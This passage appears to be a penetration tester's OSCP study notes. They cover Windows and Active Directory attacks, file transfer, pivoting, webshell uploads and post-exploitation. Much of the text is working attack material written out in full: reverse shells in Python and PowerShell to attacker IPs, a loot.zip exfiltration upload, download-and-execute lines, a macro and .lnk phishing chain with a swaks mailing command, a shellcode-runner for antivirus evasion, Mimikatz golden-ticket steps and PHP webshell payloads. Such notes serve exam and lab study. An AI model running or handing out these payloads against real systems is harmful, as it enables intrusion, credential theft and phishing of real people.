	- `net use m: \\$kaliIP\$shareName /user:$kaliUser $kaliPass
	- `copy/get $file m:\
- Example:
1. on kali - `sudo impacket-smbserver -smb2support share . -username "pop" -password "party1"`
2. on target - `net use \\$kaliIP\share /user:pop party1`
3. on target - `copy $file \\$kaliIP\share`

### Over RDP
- `xfreerdp /u:admin /p:password /v:$target /drive:/$directoryToShare,$nameToShare /dynamic-resolution`
- `xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/.`


### SSH/SCP
`scp -P $sshPort $file $user@$targetIP:$destFolder`

### FTP
- From Kali: `python -m pyftpdlib -p 21 --write` (to provide write access)
- From windows: `ftp $kaliPass` (anonymous:anonymous)

### wsgidav
`wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root $directoryToShare
- host specifies the host to listen to, "0.0.0.0" means all interaces, "--auth=anonymous" disables authentication (fine for sharing specific files during this context), and the "--root" flag specifies the directory to share. 

### .vbs file
Downloads a file from a self hosted web server:

	echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
	echo  Err.Clear >> wget.vbs 
	echo  Set http = Nothing >> wget.vbs 
	echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
	echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
	echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
	echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
	echo  http.Open "GET", strURL, False >> wget.vbs 
	echo  http.Send >> wget.vbs 
	echo  varByteArray = http.ResponseBody >> wget.vbs 
	echo  Set http = Nothing >> wget.vbs 
	echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
	echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
	echo  strData = "" >> wget.vbs 
	echo  strBuffer = "" >> wget.vbs 
	echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
	echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
	echo  Next >> wget.vbs 
	echo  ts.Close >> wget.vbs
SAMPLE USAGE:
`cscript wget.vbs http://$kaliIP/evil.exe evil.exe` 

### Powershell script builder
	echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
	echo $url = "http://[IP]/evil.exe" >>wget.ps1 
	echo $file = "new-exploit.exe" >>wget.ps1 
	echo $webclient.DownloadFile($url,$file) >>wget.ps1

Usage: 
	- `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1` 
	- `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$kaliIP/winPEAS.bat, 'winpeas.bat')`

### exe2hex
exe2hex converts to a script that recreates the file from hex string via non-interactive methods:

`powershell.exe (New-Object System.Net.WebClient).UploadFile('C:\Users\Administrator\loot.zip', 'http://$kaliIP$/20220204195540_loot.zip')`

## Kerberos 
You can use Kerbrute to enumerate accounts without ever having to exploit a machine:
`kerbrute userenum --dc [IP] -d CONTROLLER.local /home/kali/Documents/TryHackMe/Labs/Attacking_Kerberos/User.txt`
-Note you will need to add an entry to your /etc/hosts file.

### Rubeus (local)
https://github.com/GhostPack/Rubeus
- `Rubeus.exe harvest /interval:30` - to harvest tickets
- `rubeus.exe kerberoast`-  to get hashes of kerberoastable accounts.  Use bloodhound to see if they are worth anything.
- `Rubeus.exe asreproast`
	- can be cracked with hashcat
	- YOU MAY NEED TO ADD 23$ TO THE HASH!! PAY ATTENTION TO THE FORMAT!!!

### Impacket (remote)
Impacket-GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip [IP] -request
Bash script: `for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 $domain/${user} | grep -v Impacket; done`
- where $domain is just the htb of htb.local

### Mimikatz
- Can be used to dump creds, but it can also be used to gain Domain Admin tickets and impersonate them.  Obviously great for privesc.
- Steps:
	- `mimikatz.exe`
	- `privilege::debug` - if you run and don't get 20, it won't work
	- `sekurlsa::tickets /export` - to export tickets on machine. 
		- we can impersonate the ticket.  Recommend using an admin ticket...duh kerberos::ptt $ticket
	- `lsadump::lsa /patch` - If you are on a DC you can dump the hashes
	- `lsadump::lsa /inject /name:krbtgt` - can also create a golden ticket on a DC:
		- kerberos::golden /user: /domain: /sid: /krbtgt: /id:
		- you can access any machine in the domain
			- `misc::cmd`
			- `\\MACHINE1 cmd.exe`

## Port Forwarding, Mirroring

### Ligolo
[Guide](https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9)
**Basic usage**
From Kali:
1. `sudo ip tuntap add user pop mode tun ligolo`
2. `sudo ip link set ligolo up`
3. `sudo ip route add $targetIP.0/24 dev ligolo`
4. `sudo ./proxy -selfcert`

From Windows Target (agent file):
1. `.\ligolo.exe -connect $kaliIP:11601 -ignore-cert`

OR

From Linux Target (agent file):
1. `./ligolo -connect $kaliIP:11601 -ignore-cert`

Then from Kali:
1. `session`
2. `1`
3. `Start`
	1. `listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666`
	This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine). 

 **Local Port Forwarding:**
	- `ip route add 240.0.0.1/32 dev ligolo`
	- **240.0.0.1** will point to whatever machine Ligolo-ng has an active tunnel on.

### Other tools
While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I found that [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) was able to provide all of the same functionality and more simply. That said, I am linking a guide discusess the other tools. Here is frankyyano's [Pivoting & Tunneling guide](https://medium.com/@frankyyano/pivoting-tunneling-for-oscp-and-beyond-33a57dd6dc69). 

### Tips 
Port scanning through a tunnel can take a while, and it may be only TCP scans that work so no UDP or ICMP


## Steganography
1. Binwalk - A tool for searching binary files for embedded hidden files and data. 
	1. `binwalk $file # Displays the embedded data`
	2. `binwalk -e file # Extracts the data`
	3. `binwalk --dd ".*" $file # Extracts all data`
2. strings
	1. `strings $file`
	2. `strings -n 6 $file # Extracts strings with a minimum length of 6`
3. file
	1. `file $file`
4. exiftool
	1. `exiftool $file`



## Upgrading Shell

### Python
1. python -c 'import pty; pty.spawn("/bin/bash")'
2. background reverse shell using CTRL-Z
3. echo $TERM
4. stty -a
	5. Take note of the TERM type and size of the tty 
	6. Ex: xterm-256 color and rows 38; columns 116
5. Then with the reverse shell still in background "stty raw -echo"
6. fg
7. reset
8. export SHELL=bash
9. export TERM=xterm-256 color (for example)
10. stty rows 38 columns 116 

#### Full
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 36 columns 102; reset;
```
- You can get the number of rows and columns executing `stty -a`


## Shell Upgrades

### Socat
 1. From kali
- sudo socat file:'tty',raw,echo=0 tcp-listen:443
 2. From target
- socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.230:443

Others:
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

# Unsorted

## Abusing Macros

#### Microsoft Word Example
```
Sub AutoOpen()

	MyMacro

End Sub

Sub_ _Document_Open()

	MyMacro

End Sub

Sub MyMacro()

	Dim Str As String
	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
		Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
		...
		Str = Str + "A== "

End Sub
```

Python script to create the string above:
```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):

print("Str = Str + " + '"' + str[i:i+n] + '"')
```

## Abusing PATH

A Linux PATH vulnerability typically arises when a malicious user is able to exploit the environment variable `PATH` to execute unintended commands. This is especially problematic when scripts or programs with elevated privileges (like root) inadvertently execute malicious code instead of legitimate system binaries. Here's a classic example of such a vulnerability:

### Linux Example: 
Misconfigured PATH in a Privileged Script Scenario:

Imagine there's a script that is run by the root user or by a setuid root binary. This script includes a line that calls a common command like `ls` without specifying the full path (e.g., `/bin/ls`). The script assumes that the `ls` command is being run from `/bin/ls`, but it doesn’t explicitly set the `PATH` variable.

#### The Script 
(`/usr/local/bin/example_script.sh`):
```
#!/bin/bash

# The script assumes the `ls` command is safe to run without full path.
ls /important_directory

```

#### Vulnerability:

If an attacker can influence the `PATH` environment variable (perhaps by modifying it before the script runs), they could replace the `ls` command with a malicious one.

For example, the attacker might do the following:

1. **Create a Malicious Script**: The attacker creates a script named `ls` in a directory they control:

```
#!/bin/bash
echo "Malicious ls executed!"
# Potentially harmful actions could be added here
```

2. **Modify the PATH**: The attacker then modifies the `PATH` variable to include the directory containing the malicious `ls` script before `/bin`:

```
export PATH=/home/attacker:$PATH
```

3. **Execute the Vulnerable Script**: When the vulnerable script (`example_script.sh`) is executed by root, it searches for `ls` in the directories listed in `PATH` in order. Since the attacker’s directory is listed first, the script will execute the malicious `ls` instead of the legitimate `/bin/ls`.


### Windows Example

#### Scenario:
Consider a scenario where a privileged Windows service or script is executed with administrator rights. The script calls common Windows commands, such as `net.exe` (used for managing network settings) without specifying the full path (e.g., `C:\Windows\System32\net.exe`).

If an attacker can control the `PATH` environment variable, they can place a malicious executable named `net.exe` in a directory that appears earlier in the `PATH` order, causing the system to execute their malicious code instead of the legitimate system command.

#### Vulnerable Script or Service:
```
@echo off

rem The script attempts to add a user to the Administrators group
net localgroup Administrators MaliciousUser /add
```

#### Vulnerability

If the script does not specify the full path to `net.exe`, it will search for `net.exe` in the directories listed in the `PATH` environment variable. An attacker could exploit this by doing the following:

1. **Create a Malicious `net.exe`**: The attacker creates a malicious `net.exe` that performs unintended actions, such as creating a backdoor user or downloading and executing malware.
    
2. **Modify the PATH**: The attacker modifies the `PATH` environment variable to include a directory they control at the beginning of the `PATH` order. This directory contains their malicious `net.exe`.

```
set PATH=C:\Users\Attacker\malicious_directory;%PATH%
```

**Execute the Vulnerable Script**: When the vulnerable script runs, it uses the `PATH` variable to locate `net.exe`. Since the attacker's directory is listed first in `PATH`, the system will execute the malicious `net.exe` instead of the legitimate one located in `C:\Windows\System32`.

## Abusing Windows Library
Windows Library files (`.Library-ms`) connect users with data stored in remote locations (web services or shares).

### Example
Create a Windows library file connecting to a WebDAV share. In the webDAV directory, we will put a payload in the form of a `.lnk` file. We use the webDAV directory rather than our own web server to avoid spam filters. 

Steps:
1. Create the webdav directory
	1.`mkdir /home/kali/webdav`
	2. `touch /home/kali/webdav/test.txt`
	3. `/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav`
2. Prepare the `config.Library-ms` file
	1. Open VS Code
	2. File > New Text File
	3. Example code:
	   
	<?xml version="1.0" encoding="UTF-8"?>
	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
	<searchConnectorDescription>
	<isDefaultSaveLocation>true</isDefaultSaveLocation>
	<isSupported>false</isSupported>
	<simpleLocation>
	<url>http://**$kaliIP**</url>
	</simpleLocation>
	</searchConnectorDescription>
	</searchConnectorDescriptionList>
	</libraryDescription>

	4. When they click this code, it will open the webDAV directory and show whichever files we placed in `/home/kali/webDAV`. So we need to add a `.lnk` file there. 
	5. Right click on Windows desktop and click New > Shortcut. 
	6. Sample command: `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$kaliIP/powercat.ps1'); powercat -c $kaliIP -p 4444 -e powershell"`
		1. For this command to work, we also need to be serving powercat from port 80 and running a reverse listener on port 4444. 
	7. Click next. Save it as what will sound right to the victim. 
	8. Send the victim the `config.Library-ms` file, they will open it, and then hopefully execute the `.lnk` file. 
	9. Swaks example: `sudo swaks -t victim@domain.com -t victim2@domain.com --from attacker@domain.com --attach @config.Library-ms --server $mailServerIP --body @body.txt --header "Subject: Example Email" --suppress-data -ap`
		1. Where `-t` = to, `suppress-data` means to summarize info regarding SMTP transactions, and `-ap` enables password authentication

## Antivirus Evasion
As these are my OSCP notes, and AV Evasion is outside the scope of the exam, I'm mostly leaving this content out of the guide for brevity. Below is a script for manual exploitation. It must be saved as an .ps1 file, transferred to the victim Windows machine, and ran (after powershell -ep bypass). 

    $code = '
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
    
    $winFunc = 
      Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
    
    [Byte[]];
    [Byte[]]$sc = <place your shellcode here>;
    
    $size = 0x1000;
    
    if ($sc.Length -gt 0x1000) {$size = $sc.Length};
    
    $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
    
    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
    
    `$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };`


### TCM Windows Privesc Notes

Service Control:
- `sc query windefend` - checks Windows Defender
- `sc queryex type= service` - shows all services running on the machine

Firewalls
- check the netstat -ano to see what ports are open
- `netsh advfirewall firewall dump`
- `netsh firewall show state`
- `netsh firewall show config` - just keep these in mind, but these should be automated when looking at automated tools

## Burp Suite Notes

Example Image Upload POST Request:
```
POST /my-account/avatar HTTP/2
Host: 0a0e00a604e7b9e981067a4b00120099.web-security-academy.net
Cookie: session=s2YCbN4BxaVG3wnNJMH3ajYUVfKfLYTc
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------866603063390648708194728913
Content-Length: 519
Origin: https://0a0e00a604e7b9e981067a4b00120099.web-security-academy.net
Referer: https://0a0e00a604e7b9e981067a4b00120099.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------866603063390648708194728913
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>

etc.
```

Exploits:
1. can change `Content-Type` to `application/pdf` or `image/jpeg` before uploading and then access how you would
2. can change `filename` to `..%2fwebshell.php` and then access from a different directory
	1. Example: instead of `$URL/files/avatars/webshell.php`, access from `$URL/files/webshell.php`
3. Upload an .htaccess file with this content in order to execute .fart files as php:
	1. `AddType application/x-httpd-php .fart`
4. Obfuscate the file type (remember to still call for exploit.php though):
	1. `exploit.php.jpg` (could be parsed as php depending on algorithm)
	2. `exploit.php.` (occasionally trailing .'s or spaces are stripped)
	4. `exploit%2Ephp` (in case the filename is decoded but only server side)
	5. `exploit.php;.jpg` (can cause discrepancies on what is considered the end of the file name)
	6. `exploit.php%00.jpg` (can cause discrepancies on what is considered the end of the file name)
	7. `exploit.p.phphp` (in case .php is stripped from the file)
5. Hide php code inside a jpg using exiftool: 
	1. This worked: `exiftool -Comment="<?php echo 'content here' . file_get_contents('/home/user/secret') . 'content here' ; ?>" image.jpg -o outfile.php`
	2. ```exiftool -Comment="<?php -r '\$sock=fsockopen(\"192.168.150.131\",80);\`/bin/bash <&3 >&3 2>&3\`;' ?>" image.jpg -o outfile.php```
	3. ^ Couldn't get this one working
	
6. It's worth noting that some web servers may be configured to support PUT requests:

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```   

## Git

There's [git-dumper](https://github.com/arthaud/git-dumper)

When we find a git directory on a website we can download it with:
- `wget -r http://site.com/.git` 
	- OR `git-dumper http://site.com/.git folder.git`
		- may need `pipx install git-dumper` first
	- OR simply `git clone http://site.com/.git`
- Then run `git checkout` inside the directory
- 

### command guide

`git clone`: Clone the repository to your local machine.
	- `git clone <repository_url>`

`git log`: View the commit history to understand the evolution of the repository.
	- `git log`

`git status`: Check the current status of the repository, including any modified or untracked files.
	- `git status`

`git diff`: View the differences between files, useful for understanding changes made between commits.
- `git diff`

`git branch`: List all branches in the repository.
	- `git branch -a`

`git show`: Show information about a specific commit.
	- `git show <commit_hash>` (967fa71c359fffcbeb7e2b72b27a321612e3ad11)

`git blame`: See who last modified each line of a file, helpful for understanding the history of changes.
	- `git blame <file_name>`

`git grep`: Search for specific strings or patterns within the repository.\
	- `git grep <search_term>`

`git remote`: View the remote repositories associated with the local repository.
	-`git remote -v`

`git reflog`: Show a log of changes to the repository's HEAD.
	- `git reflog`

`git fsck`: Perform a filesystem check on the repository.
	- `git fsck`

## Keepass

To crack the entry password:
- `keepass2john Database.kdbx > Database.hash`
- then `john --format=keepass Database.hash` for entry password
- then `kpcli --kdb Database.kdbx`
	- then `ls` `cd $Directory` and `show "$Full Entry"

## LAPS

### Get LAPS password 
This is the `ms-mcs-AdmPwd`
If LAPS is enabled, try any of:
1. `nxc ldap $target -u $user -p $password --kdcHost $target -M laps`
2. `python3 pyLAPS.py --action get -u '$user' -d 'butchy.offsec' -p '$password' --dc-ip $target`
3. pyLAPS.py can also get it using NTLM (`-p NTLM:NTLM`)

## Metasploit

### Initial Usage
Selecting a module:
  - show auxiliary - shows auxiliary modules
  - search type:auxiliary smb - searches for auxiliary modules which include smb
  - info - after selecting learn more about the module
  - vulns - after running check to see if there were any discovered
  - creds - check for any creds discovered during the use of msfconsole
  - search Apache 2.4.49 - search for Apache 2.4.49 exploits
 Dealing with sessions:
  - sessions -l - list sessions 
  - sessions -i 2 - initiate session 2
Dealing with channels (meterpreter):
  - ^Z - background channel - y
  - channel -l - list channels
  - channel -i - channel -i 1
Dealing with jobs:
  - run -j
  - jobs - checks for runnign jobs

Local commands:
  - lpwd - local (attacking machine) pwd
  - lcd - local (attacking machine) cd
  - upload /usr/bin/$binary /tmp/ - uploads binary such as linux-privesc-check from Attacking machine to target

Payloads (msfvenom)
  - msfvenom -l payloads --platform windows --arch x64 - lists payloads for windows 64 bit 
  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=443 -f exe -o nonstaged.exe - creates a reverse shell tcp payloads on that for attacker (LHOST) with the exe format and the name nonstaged.exe
  - iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe (execute from Target to download shell)
    - use nc -lvnp 443 or multi/handler
  - use multi/handler - exploit in msf
  - set payload windows/x64/shell/reverse_tcp - so either set up in nc or msfconsole's multi/handler

### Post Exploit 
- idletime (meterpreter) - check that user's idletme
- shell - switch to shell
  - whoami /priv 
- getuid - check user *from meterpreter*
- getsystem - elevate privileges from meterpreter
- ps 
  - then migrate $PID (check to see if other users are running it)
  - execute -H -f notepad
    - -H = hidden, -f = program
- Check Integrity Level of current process:
  - shell
  - powershell -ep bypass
  - Import-Module NtObjectManager
  - Get-NtTokenIntegrityLevel 
    - If that doesnt work then move on, if it does:
      - search UAC - search for UAC bypass modules
      - use exploit/windows/local/bypassuac_sdclt
        - set SESSION $sessionNumber
- From meterpreter:
  - load kiwi (loads mimikatz)
  - help - shows all commands, including creds_msv

## Misc Notes

### Remember
1. you can mkdir a temp directory and write to it
2. One liners if you can't load a module and then run it: `powershell -ep bypass ./PowerUp.ps1` 

### to add to a file without nano 
cat <<'EOT'> file.name
> text
> text
> EOT
(the EOT ends the file)

### Useful Python reverse shell
Try when others aren't working.  
`python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.235",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")"`
- same as Python #2 from rev shells, but with the interior `"`'s escaped with `\`'s

### Cron jobs - linpeas

```
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                     
/usr/bin/crontab                                                                                                                                                                                                                           
incrontab Not Found
-rw-r--r-- 1 root root   74 Oct 31  2019 /etc/cron.deny                                                                                                                                                                                    
-rw-r--r-- 1 root root   66 Jan 15  2021 /etc/crontab.bak

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Nov  5  2020 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..
-rw-r--r--  1 root root  128 Oct 31  2019 0hourly

/etc/cron.daily:
total 8
drwxr-xr-x  2 root root 4096 Oct 31  2019 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Nov  5  2020 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..
-rwxr-xr-x  1 root root  580 Oct 31  2019 0anacron

/etc/cron.monthly:
total 8
drwxr-xr-x  2 root root 4096 Oct 31  2019 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..

/etc/cron.weekly:
total 8
drwxr-xr-x  2 root root 4096 Oct 31  2019 .
drwxr-xr-x 51 root root 4096 Jan 15  2021 ..

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Jul 27 17:08 cron.daily
-rw------- 1 root root    9 Jul 27 17:48 cron.monthly
-rw------- 1 root root    9 Jul 27 17:28 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh


SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
RANDOM_DELAY=45
START_HOURS_RANGE=3-22

```

This means that pull.sh is executed every two minutes, and backups.sh is every 3 minutes. 


### Python Errors
#### Wrong Modules
1. `sudo apt-get install python3-venv`
2. `python3 -m venv myenv`
3. `source myenv/bin/activate`
4. Then install what you actually need:
	1. `pip install -r requirements.txt` OR
	2. - `pip install requests urllib3==1.26.8 charset_normalizer==2.0.12` With specific modules named
5.  `python $script.py`
6.  `deactivate`

#### SSL Error
Run these three commands:
1. `export PYTHONWARNINGS="ignore:Unverified HTTPS request"`
2. `export REQUESTS_CA_BUNDLE=""`
3. `export CURL_CA_BUNDLE=""`
	1. Note that these variables are set temporarily with that terminal session, but could be reversed by repeating the command with `unset` instead of `export`


#### Generate base64 shell

```
import sys
import base64

payload = '$client = New-Object

System.Net.Sockets.TCPClient("__**192.168.118.2**__",__**443**__);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```


### PHP Wrappers
These become relevant when a php page in a browser is requesting another php file, such as in the case of `http://example.com/index.php?page=config.php`

Full page:
`http://example.com/index.php?page=php://filter/resource=config.php`

Base64:
`http://example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config`
- You may not need the .php at the end

Data:
`http://example.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>`
- But this may be blocked so we can try with base64:
	- `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
		- Output: `PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==`
- `http://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`

### Time Saving Enumeration
Windows:
- `tree /f /a`- to list all files in directories and subdirectories

Linux:
- `CTRL + r` - search through previous commands
- `tree` similar to `find .`
- `CTRL + Shift + L` to move command line to top of the screen so you can see the results better
- `smbclient //<IP>/<share_name> -c 'recurse;ls'`. This will recursively list all the files in the share, allowing you to quickly check if there is anything useful.

## ssh
### creating ssh key
- ssh-keygen
- `ssh -p 2222(unless 22) -i $created_key(no pub) $user@$host`
- Using a id_sa (private key) from /home/user/.ssh/id_sa

### Password Protected SSH key
1. may need to chmod 600 id_rsa (too many permissions won't work)
2. ssh2john id_rsa > ssh.hash
3. remove "id_rsa:" from ssh.hash
4. hashcat -h | grep -i "ssh" (22921 for example)
5. hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

## UAC
To confirm if it's enabled:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
- If there is a 1, it is. If there is a 0, it's not. 

Check which level is configured:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

- If `**0**` then, UAC won't prompt (like **disabled**)
    
- If `**1**` the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
    
- If `**2**` (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
    
- If `**3**` like `1` but not necessary on Secure Desktop
    
- If `**4**` like `2` but not necessary on Secure Desktop
    
- if `**5**`(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

## Misc AD Tool Syntax

### Kerbrute
Password spraying:
`.\kerbrute_linux_arm64 passwordspray -d $domain.com $usersFile "$password"`
- requires kerbrute to be installed - not on kali by default. See [PopMyKali](https://github.com/cagrigsby/PopMyKali/blob/main/jumpstart.sh) repo. 

### Impacket
```
impacket-smbclient [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share

impacket-lookupsid [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target

impacket-services [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration

impacket-secretsdump [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target
impacket-secretsdump -sam '/path/to/SAM' -system '/path/to/SYSTEM' LOCAL


impacket-GetUserSPNs [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS

impacket-GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #AS-REProasting, need to provide usernames list

##RCE
impacket-psexec test.local/john:password123@10.10.10.1
impacket-psexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-wmiexec test.local/john:password123@10.10.10.1
impacket-wmiexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-smbexec test.local/john:password123@10.10.10.1
impacket-smbexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-atexec test.local/john:password123@10.10.10.1 <command>
impacket-atexec -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
```
You can save SAM, SYSTEM, and SECURITY all at once with:
`impacket-reg $domain/$user:$password@$target backup -o '\\ATTACKER_IP\someshare'`
- must start `impacket-smbserver` first

#### NTLM Relay
`sudo impacket-ntlmrelayx --no-http-server -smb2support -t $targetIP -c "powershell -enc JABjAGwAaQ..."
- We receive an authentication request on our machine and essentially re-route it to a different machine (`$targetIP`) so that's it's executed there. 

#### mssqlclient
`impacket-mssqlclient $user:$pass@$target -windows-auth`
- This is for accessing the db, not code execution (unless you enable xp_cmdshell)

#### psexec 

#### wmiexec
- `impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@$target (can be 0/24)
	- Requires an SMB connection through the firewall, the Windows File and Printer Sharing feature must be enabled, and the admin share called ADMIN$ must be available. 

### Evil WinRM
```
##winrm service discovery
nmap -p5985,5986 <IP>
5985 - plaintext protocol
5986 - encrypted

##Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open

##Login with Hash
evil-winrm -i <IP> -u user -H ntlmhash

##Login with key
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key

##Logs
evil-winrm -i <IP> -u user -p pass -l

##File upload and download
upload <file>
download <file> <filepath-kali> #not required to provide path all time

##Loading files direclty from Kali location
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
menu # to view commands
#There are several commands to run
#This is an example for running a binary
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```


### NXC
Help
`nxc smb --help` for SMB

Can add `| grep +` to only return positive results

